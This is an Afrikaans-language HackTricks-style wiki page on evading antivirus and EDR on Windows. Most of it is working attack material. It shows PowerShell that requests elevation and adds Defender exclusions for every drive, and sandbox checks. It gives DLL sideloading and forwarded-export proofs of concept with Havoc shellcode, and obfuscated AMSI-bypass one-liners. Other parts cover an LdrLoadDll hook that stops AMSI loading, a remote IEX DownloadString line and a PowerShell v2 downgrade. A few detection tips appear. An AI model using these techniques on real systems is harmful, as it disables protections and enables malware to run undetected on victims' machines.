# Antivirus (AV)-omseiling

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is oorspronklik geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): ’n Hulpmiddel om te keer dat Windows Defender werk.
- [no-defender](https://github.com/es3n1n/no-defender): ’n Hulpmiddel om te keer dat Windows Defender werk deur ’n ander AV na te boots.
- [Deaktiveer Defender as jy admin is](basic-powershell-for-pentesters/README.md)

### UAC-lokmiddel in installer-styl voordat met Defender gepeuter word

Openbare loaders wat hulle as game cheats voordoen, word dikwels as ongetekende Node.js/Nexe-installers versprei wat eers **die gebruiker om verhoogde regte vra** en Defender eers daarna onskadelik maak. Die proses is eenvoudig:

1. Toets vir ’n administratiewe konteks met `net session`. Die opdrag slaag slegs wanneer die gebruiker admin-regte het, dus dui ’n mislukking daarop dat die loader as ’n standaardgebruiker loop.
2. Herbegin homself onmiddellik met die `RunAs`-werkwoord om die verwagte UAC-toestemmingsversoek te aktiveer, terwyl die oorspronklike opdragreël behoue bly.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Slagoffers glo reeds dat hulle “cracked”-sagteware installeer, daarom aanvaar hulle gewoonlik die prompt, wat die malware die regte gee wat dit nodig het om Defender se beleid te verander.<sup>[[26]](#references)</sup>

### Omvattende `MpPreference`-uitsluitings vir elke dryfletter

Sodra dit verhoogde voorregte verkry het, maksimeer GachiLoader-agtige kettings Defender se blinde kolle eerder as om die diens heeltemal af te skakel. Die loader beëindig eers die GUI-waghond (`taskkill /F /IM SecHealthUI.exe`) en stel dan **uiters breë uitsluitings** in, sodat elke gebruikersprofiel, stelselgids en verwyderbare skyf nie geskandeer kan word nie:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Sleutelwaarnemings:

- Die lus gaan deur elke gemonteerde lêerstelsel (D:\, E:\, USB-stokkies, ens.), so **enige toekomstige payload wat enige plek op die skyf afgelaai word, word geïgnoreer**.
- Die uitsluiting van die `.sys`-uitbreiding is toekomsgerig—aanvallers behou die opsie om later ongetekende drywers te laai sonder om Defender weer aan te raak.
- Alle veranderinge word onder `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` gestoor, sodat latere fases kan bevestig dat die uitsluitings behoue bly of dit kan uitbrei sonder om UAC weer te aktiveer.

Omdat geen Defender-diens gestop word nie, rapporteer eenvoudige gesondheidskontroles steeds “antivirus active”, al raak intydse inspeksie nooit daardie paaie nie.<sup>[[26]](#references)</sup>

## **AV-ontduikingsmetodologie**

AV’s gebruik tans verskillende metodes om vas te stel of ’n lêer kwaadwillig is of nie: statiese opsporing, dinamiese ontleding en, vir die meer gevorderde EDR’s, gedragsontleding.

### **Statiese opsporing**

Statiese opsporing word gedoen deur bekende kwaadwillige stringe of grepe-skikkings in ’n binêre lêer of script te merk, en ook inligting uit die lêer self te onttrek (bv. lêerbeskrywing, maatskappynaam, digitale handtekeninge, ikoon, kontrolesom, ens.). Dit beteken dat die gebruik van bekende publieke nutsmiddels jou makliker kan laat uitken, aangesien hulle waarskynlik ontleed en as kwaadwillig gemerk is. Daar is ’n paar maniere om hierdie soort opsporing te omseil:

- **Encryption**

As jy die binêre lêer enkripteer, sal AV jou program nie kan opspoor nie, maar jy sal ’n soort loader nodig hê om die program te dekripteer en in die geheue uit te voer.

- **Obfuscation**

Soms hoef jy net ’n paar stringe in jou binêre lêer of script te verander om dit by AV verby te kry, maar dit kan ’n tydrowende taak wees, afhangend van wat jy probeer verduister.

- **Custom tooling**

As jy jou eie nutsmiddels ontwikkel, sal daar geen bekende slegte handtekeninge wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> ’n Goeie manier om teen Windows Defender se statiese opsporing te toets, is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit verdeel basies die lêer in verskeie segmente en laat Defender dan elkeen afsonderlik skandeer. Só kan dit jou presies vertel watter stringe of grepe in jou binêre lêer gemerk word.

Ek beveel sterk aan dat jy na hierdie [YouTube-snitlys](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV-ontduiking kyk.

### PE-kenmerktoetse vir statiese klassifiseerders vanlyn

Packed of geënkripteerde payload-grepe is slegs een invoer vir ’n statiese klassifiseerder. EMBER2024 onttrek PE-kenmerke, insluitend imports, exports, afdelings, headers en Authenticode-data.<sup>[[48]](#references)</sup> In een loader-eksperiment het die byvoeging van 141 onskuldig-lykende imports die EMBER2024-kwaadwilligheidstelling met 93% verlaag, terwyl imports wat met malware geassosieer word, dit verhoog het. Dit is ’n resultaat vir daardie model en daardie monsters, nie ’n betroubare omseiling van ’n spesifieke AV/EDR-produk nie.<sup>[[50]](#references)</sup>

Vir ’n gemagtigde loader-toets, hou die payload en uitvoeringspad konstant, verander een beoogde bouveranderlike per variant, en vergelyk die tellings vanlyn. Inspekteer die gevolglike PE-kenmerke, want ’n bouverandering kan meer as een kenmerkgroep beïnvloed.<sup>[[49]](#references)[[50]](#references)</sup> Om beoogde imports in die IAT te hou, roep die gekose Win32-API’s vanuit bereikbare kode aan. Wissel die keuse af en versprei oproeppunte oor bouweergawes eerder as om ’n vaste kamoefleerfunksie te skep wat ’n handtekening kan word. Die eksperiment het ook laer tellings gerapporteer met geldige kodesignering, export-inskrywings en meer funksies wat `.pdata` vergroot; ongeldige signering het min uitwerking gehad, en die uitwerking van `.pdata` was gering.<sup>[[50]](#references)</sup>

Die `thrember`-pakket verskaf kenmerkonttrekking en maatstafmodelle. Nadat jy dit geïnstalleer het, gebruik `thrember.download_models("models")` met ’n bestaande `models`-gids, en voer dan die scorer vanuit die ouergids uit: die aflaai-helper verander die huidige werkgids. Die PE-klassifiseerder kan ’n gids met bouweergawes beoordeel sonder om dit na ’n skanderingsdiens op te laai:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Hou die model- en feature-extractor-weergawes vas tydens die vergelyking. ’n Laer offline-telling wys slegs hoe hierdie classifier op die veranderde binary reageer; dit bewys nie ontduiking van gedragsontleding, emulasie of ’n verskaffer se ander model nie.<sup>[[49]](#references)[[50]](#references)</sup> Sien die afsonderlike uitvoeringsmodel vir [polimorfisme per build en kamoeflering van die outer binary in gevirtualiseerde payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable).

### **Dinamiese ontleding**

Dinamiese ontleding is wanneer die AV jou binary in ’n sandbox laat loop en vir kwaadwillige aktiwiteit dophou (bv. wanneer dit jou blaaier se wagwoorde probeer dekripteer en lees, ’n minidump van LSASS maak, ens.). Dit kan ’n bietjie moeiliker wees om mee te werk, maar hier is ’n paar dinge wat jy kan doen om sandboxes te ontduik.

- **Sleep voor uitvoering** Afhangend van hoe dit geïmplementeer is, kan dit ’n uitstekende manier wees om AV se dinamiese ontleding te omseil. AV’s het baie min tyd om lêers te skandeer sonder om die gebruiker se werkvloei te onderbreek, so lang sleep-tydperke kan die ontleding van binaries ontwrig. Die probleem is dat baie AV-sandboxes die sleep eenvoudig kan oorslaan, afhangend van hoe dit geïmplementeer is.
- **Kontroleer die masjien se hulpbronne** Sandboxes het gewoonlik baie min hulpbronne beskikbaar (bv. < 2GB RAM), anders kan hulle die gebruiker se masjien vertraag. Jy kan ook baie kreatief raak, byvoorbeeld deur die CPU se temperatuur of selfs die waaierspoed na te gaan; nie alles sal in die sandbox geïmplementeer wees nie.
- **Masjienspesifieke kontroles** As jy ’n gebruiker wil teiken wie se werkstasie aan die "contoso.local"-domein gekoppel is, kan jy die rekenaar se domein nagaan om te sien of dit ooreenstem met die een wat jy gespesifiseer het. As dit nie ooreenstem nie, kan jy jou program laat afsluit.

Dit blyk dat die rekenaarnaam van Microsoft Defender se Sandbox HAL9TH is. Jy kan dus die rekenaarnaam in jou malware nagaan voordat dit ontplof; as die naam HAL9TH is, beteken dit dat jy binne Defender se sandbox is, en kan jy jou program laat afsluit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog ’n paar baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) om Sandboxes teë te werk

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev-kanaal</p></figcaption></figure>

Soos ons vroeër in hierdie plasing gesê het, sal **publieke tools** uiteindelik **opgespoor word**, so jy moet jouself die volgende afvra:

As jy byvoorbeeld LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy ’n ander, minder bekende projek gebruik wat ook LSASS dump?

Laasgenoemde is waarskynlik die regte antwoord. As ons mimikatz as voorbeeld neem, is dit waarskynlik een van die malware-stukke wat die meeste deur AV’s en EDR’s gemerk word, indien nie die heel meeste nie. Hoewel die projek self baie gaaf is, is dit ook ’n nagmerrie om daarmee te werk as jy AV’s wil omseil. Soek dus net alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads vir ontduiking wysig, maak seker dat jy **outomatiese voorbeeldindiening** in Defender **afskakel**, en asseblief, ernstig, **MOENIE NA VIRUSTOTAL OPLAAI NIE** as jou doel is om ontduiking op die lang termyn te bereik. As jy wil nagaan of ’n spesifieke AV jou payload opspoor, installeer dit op ’n VM, probeer om outomatiese voorbeeldindiening af te skakel en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Wanneer dit moontlik is, **gee altyd voorkeur aan DLLs vir ontduiking**. Volgens my ervaring word DLL-lêers gewoonlik **baie minder opgespoor** en ontleed, so dit is ’n baie eenvoudige truuk om in sommige gevalle opsporing te vermy (as jou payload natuurlik op ’n manier as ’n DLL kan loop).

Soos ons in hierdie prent kan sien, het ’n DLL-payload van Havoc ’n opsporingskoers van 4/26 op antiscan.me, terwyl die EXE-payload ’n opsporingskoers van 7/26 het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me-vergelyking van ’n gewone Havoc EXE-payload met ’n gewone Havoc DLL</p></figcaption></figure>

Nou wys ons ’n paar truuks wat jy met DLL-lêers kan gebruik om baie meer onopvallend te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** benut die DLL-soekvolgorde wat die loader gebruik deur die slagoffertoepassing en kwaadwillige payload(s) langs mekaar te plaas.

Jy kan met [Siofra](https://github.com/Cybereason/siofra) en die volgende PowerShell-script nagaan watter programme vatbaar is vir DLL Sideloading:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Hierdie opdrag sal die lys uitvoer van programme in "C:\Program Files\\" wat vatbaar is vir DLL hijacking, asook die DLL-lêers wat hulle probeer laai.

Ek beveel sterk aan dat jy **self programme verken wat DLL Hijackable/Sideloadable is**. Hierdie tegniek is redelik onopvallend wanneer dit behoorlik uitgevoer word, maar as jy publiek bekende DLL Sideloadable-programme gebruik, kan jy maklik uitgevang word.

Deur bloot 'n kwaadwillige DLL met die naam wat 'n program verwag om te laai te plaas, sal jou payload nie laai nie, aangesien die program spesifieke funksies binne daardie DLL verwag. Om hierdie probleem op te los, gaan ons 'n ander tegniek genaamd **DLL Proxying/Forwarding** gebruik.

**DLL Proxying** stuur die oproepe wat 'n program maak van die proxy- (en kwaadwillige) DLL na die oorspronklike DLL aan. Sodoende behou die program sy funksionaliteit en kan jou payload uitgevoer word.

Ek gaan die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)-projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Hier is die stappe wat ek gevolg het:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Die laaste opdrag sal vir ons 2 lêers gee: ’n DLL-bronkodesjabloon en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Hier is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (met [SGN](https://github.com/EgeBalci/sgn) geënkodeer) en die proxy DLL het ’n Detection rate van 0/26 by [antiscan.me](https://antiscan.me)! Ek sou dit ’n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek **beveel sterk aan** dat jy [S3cur3Th1sSh1t se twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk, asook [ippsec se video](https://www.youtube.com/watch?v=3eROsG_WNpE), om meer te leer oor wat ons bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE-modules kan funksies uitvoer wat eintlik "forwarders" is: in plaas daarvan om na kode te wys, bevat die export-inskrywing ’n ASCII-string in die vorm `TargetDll.TargetFunc`. Wanneer ’n caller die export resolve, sal die Windows loader:

- `TargetDll` laai as dit nie reeds gelaai is nie
- `TargetFunc` daaruit resolve

Belangrike gedrag om te verstaan:
- As `TargetDll` ’n KnownDLL is, word dit vanuit die beskermde KnownDLLs-naamruimte verskaf (bv. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- As `TargetDll` nie ’n KnownDLL is nie, word die normale DLL-soekvolgorde gebruik, wat die gids insluit van die module wat die forward-resolution uitvoer.

Dit maak ’n indirekte sideloading-primitief moontlik: vind ’n ondertekende DLL wat ’n funksie uitvoer wat na ’n module met ’n naam wat nie ’n KnownDLL is nie, geforward word, en plaas dan daardie ondertekende DLL saam met ’n aanvallerbeheerde DLL met presies dieselfde naam as die geforwarde teikenmodule. Wanneer die geforwarde export aangeroep word, resolve die loader die forward en laai jou DLL vanuit dieselfde gids, wat jou DllMain uitvoer.<sup>[[13]](#references)</sup>

Voorbeeld waargeneem op Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` is nie ’n KnownDLL nie, dus word dit via die normale soekvolgorde opgelos.

PoC (copy-paste):
1) Kopieer die getekende stelsel-DLL na ’n skryfbare vouer.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas ’n kwaadwillige `NCRYPTPROV.dll` in dieselfde vouer. ’n Minimale `DllMain` is genoeg om kode-uitvoering te verkry; jy hoef nie die aangestuurde funksie te implementeer om `DllMain` te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Aktiveer die aanstuur met ’n ondertekende LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Waargenome gedrag:
- rundll32 (onderteken) laai die side-by-side `keyiso.dll` (onderteken)
- Wanneer `KeyIsoSetAuditingInterface` opgelos word, volg die loader die forward na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers ’n "missing API"-fout nadat `DllMain` reeds uitgevoer is

Opsporingswenke:
- Fokus op forwarded exports waar die teikenmodule nie ’n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports met hulpmiddels soos hierdie optel:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11-forwarder-inventaris om na kandidate te soek: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idees vir opsporing/verdediging:
- Monitor LOLBins (bv. rundll32.exe) wat ondertekende DLL's vanaf nie-stelselpaadjies laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basisnaam vanaf daardie gids
- Waarsku oor proses-/modulekettings soos: `rundll32.exe` → nie-stelsel-`keyiso.dll` → `NCRYPTPROV.dll` onder paaie waarop gebruikers kan skryf
- Dwing kode-integriteitsbeleide (WDAC/AppLocker) af en verbied skryf+uitvoer in toepassinggidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is 'n payload-gereedskapstel om EDR's te omseil deur opgeskorte prosesse, direkte syscalls en alternatiewe uitvoeringsmetodes te gebruik`

Jy kan Freeze gebruik om jou shellcode op 'n geheimsinnige manier te laai en uit te voer.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion is bloot ’n kat-en-muis-speletjie: wat vandag werk, kan môre opgespoor word. Moet dus nooit net op een hulpmiddel staatmaak nie; probeer, indien moontlik, verskeie evasion-tegnieke aan mekaar skakel.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR’s plaas dikwels **user-mode inline hooks** op `ntdll.dll` se syscall-stubs. Om hierdie hooks te omseil, kan jy **direct** of **indirect** syscall-stubs genereer wat die korrekte **SSN** (System Service Number) laai en na kernel mode oorskakel sonder om die hooked export-entrypoint uit te voer.<sup>[[32]](#references)</sup>

**Aanroepopsies:**
- **Direct (embedded)**: plaas ’n `syscall`/`sysenter`/`SVC #0`-instruksie in die gegenereerde stub (geen `ntdll`-export word getref nie).
- **Indirect**: spring na ’n bestaande **syscall**-gadget binne `ntdll`, sodat dit lyk asof die kernel-oorgang van `ntdll` afkomstig is (nuttig vir heuristic evasion); **randomized indirect** kies ’n gadget uit ’n poel vir elke aanroep.
- **Egg-hunt**: vermy dat die statiese `0F 05`-opcode-volgorde op skyf ingebed word; los ’n syscall-volgorde tydens looptyd op.

**Hook-resistant SSN-resolusiestrategieë:**
- **FreshyCalls (VA sort)**: lei SSN’s af deur syscall-stubs volgens virtuele adres te sorteer, eerder as om stub-grepe te lees.
- **SyscallsFromDisk**: karteer ’n skoon `\KnownDlls\ntdll.dll`, lees SSN’s uit sy `.text` en karteer dit dan weer uit (omseil alle hooks in geheue).
- **RecycledGate**: kombineer VA-gesorteerde SSN-afleiding met opcode-validering wanneer ’n stub skoon is; gebruik VA-afleiding as terugval indien dit hooked is.
- **HW Breakpoint**: stel DR0 op die `syscall`-instruksie en gebruik ’n VEH om die SSN tydens looptyd uit `EAX` vas te lê, sonder om hooked grepe te ontleed.

Voorbeeld van SysWhispers4-gebruik:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AV's slegs **lêers op skyf** skandeer, so as jy op een of ander manier loonvragte **direk in die geheue** kon uitvoer, kon die AV niks doen om dit te voorkom nie, aangesien dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is in hierdie Windows-komponente geïntegreer.

- User Account Control, of UAC (verhoging van EXE, COM, MSI of ActiveX-installasie)
- PowerShell (skrifte, interaktiewe gebruik en dinamiese kode-evaluering)
- Windows Script Host (wscript.exe en cscript.exe)
- JavaScript en VBScript
- Office VBA-makro's

Dit stel antivirusoplossings in staat om skrifgedrag te ondersoek deur die inhoud van skrifte in 'n vorm bloot te stel wat nie geënkripteer of geobfuskeer is nie.

As jy `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` uitvoer, sal dit die volgende waarskuwing in Windows Defender veroorsaak.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let op hoe dit `amsi:` en dan die pad na die uitvoerbare lêer waaruit die skrif uitgevoer is, byvoeg; in hierdie geval, powershell.exe

Ons het geen lêer na skyf geskryf nie, maar is steeds in die geheue opgespoor weens AMSI.

Verder word C#-kode sedert **.NET 4.8** ook deur AMSI verwerk. Dit raak selfs `Assembly.Load(byte[])` wanneer dit vir uitvoering in die geheue gebruik word. Daarom word dit aanbeveel om laer weergawes van .NET (soos 4.7.2 of laer) vir uitvoering in die geheue te gebruik as jy AMSI wil ontduik.

Daar is 'n paar maniere om AMSI te omseil:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met statiese opsporing werk, kan die wysiging van die skrifte wat jy probeer laai 'n goeie manier wees om opsporing te ontduik.

AMSI kan egter skrifte deobfuskeer, selfs al het hulle verskeie lae; daarom kan obfuskering 'n swak opsie wees, afhangend van hoe dit gedoen word. Dit maak ontduiking nie juis eenvoudig nie. Soms hoef jy egter net 'n paar veranderlike name te verander, en dan is jy reg; dit hang dus af van hoe sterk iets gemerk is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell-proses (ook cscript.exe, wscript.exe, ens.) te laai, is dit maklik om daarmee te peuter, selfs wanneer jy as 'n onbevoorregte gebruiker loop. Weens hierdie fout in die implementering van AMSI het navorsers verskeie maniere gevind om AMSI-skandering te ontduik.

**Dwing 'n fout af**

As jy AMSI-inisialisering dwing om te misluk (amsiInitFailed), sal geen skandering vir die huidige proses begin word nie. Dit is oorspronklik deur [Matt Graeber](https://twitter.com/mattifestation) bekend gemaak, en Microsoft het 'n handtekening ontwikkel om wydverspreide gebruik te voorkom.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Al wat nodig was, was een reël PowerShell-kode om AMSI vir die huidige PowerShell-proses onbruikbaar te maak. Hierdie reël is natuurlik deur AMSI self gemerk, dus is ’n wysiging nodig om hierdie tegniek te gebruik.

Hier is ’n gewysigde AMSI-bypass wat ek uit hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Hou in gedagte dat dit waarskynlik gemerk sal word sodra hierdie plasing gepubliseer word, dus moet jy geen kode publiseer as jou plan is om onopgespoor te bly nie.

**Memory Patching**

Hierdie tegniek is aanvanklik deur [@RastaMouse](https://twitter.com/_RastaMouse/) ontdek. Dit behels dat die adres van die "AmsiScanBuffer"-funksie in amsi.dll opgespoor word (wat verantwoordelik is vir die skandering van die gebruiker se invoer) en dat dit met instruksies oorskryf word om die kode vir E_INVALIDARG terug te gee. Op dié manier gee die resultaat van die werklike skandering 0 terug, wat as 'n skoon resultaat geïnterpreteer word.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.

Daar is ook baie ander tegnieke wat gebruik word om AMSI met powershell te omseil. Kyk na [**hierdie bladsy**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**hierdie repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.

### Blokkering van AMSI deur te verhoed dat amsi.dll laai (LdrLoadDll hook)

AMSI word slegs geïnisialiseer nadat `amsi.dll` in die huidige proses gelaai is. 'n Robuuste, taal-onafhanklike omseiling is om 'n user-mode hook op `ntdll!LdrLoadDll` te plaas wat 'n fout teruggee wanneer die aangevraagde module `amsi.dll` is. Gevolglik word AMSI nooit gelaai nie en vind daar geen skanderings vir daardie proses plaas nie.<sup>[[23]](#references)</sup>

Implementeringsoorsig (x64 C/C++-pseudokode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Werk met PowerShell, WScript/CScript en pasgemaakte loaders (enigiets wat andersins AMSI sou laai).
- Kombineer dit met die voer van scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang opdragreël-artefakte te vermy.
- Is al gebruik deur loaders wat via LOLBins uitgevoer word (bv. `regsvr32` wat `DllRegisterServer` oproep).

Die nutsding **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genereer ook scripts om AMSI te omseil.
Die nutsding **[https://amsibypass.com/](https://amsibypass.com/)** genereer ook scripts om AMSI te omseil. Dit vermy handtekeningopsporing deur ’n ewekansige gebruiker-gedefinieerde funksie, veranderlikes en karakteruitdrukkings te gebruik, en wissel die hooflettergebruik van PowerShell-sleutelwoorde ewekansig af om handtekeningopsporing te vermy.

**Verwyder die bespeurde handtekening**

Jy kan ’n nutsding soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die bespeurde AMSI-handtekening uit die geheue van die huidige proses te verwyder. Hierdie nutsding werk deur die geheue van die huidige proses vir die AMSI-handtekening te skandeer en dit dan met NOP-instruksies te oorskryf, wat dit effektief uit die geheue verwyder.

**AV/EDR-produkte wat AMSI gebruik**

Jy kan ’n lys van AV/EDR-produkte wat AMSI gebruik, vind by **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Gebruik PowerShell weergawe 2**
As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou scripts kan laat loop sonder dat AMSI dit skandeer. Jy kan dit so doen:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell-logging is ’n funksie waarmee jy alle PowerShell-opdragte wat op ’n stelsel uitgevoer word, kan aanteken. Dit kan nuttig wees vir ouditering en probleemoplossing, maar dit kan ook ’n **probleem wees vir aanvallers wat opsporing wil ontduik**.

Om PowerShell-logging te omseil, kan jy die volgende tegnieke gebruik:

- **Deaktiveer PowerShell Transcription en Module Logging**: Jy kan ’n hulpmiddel soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Gebruik PowerShell-weergawe 2**: As jy PowerShell-weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou scripts kan uitvoer sonder dat AMSI dit skandeer. Jy kan dit so doen: `powershell.exe -version 2`
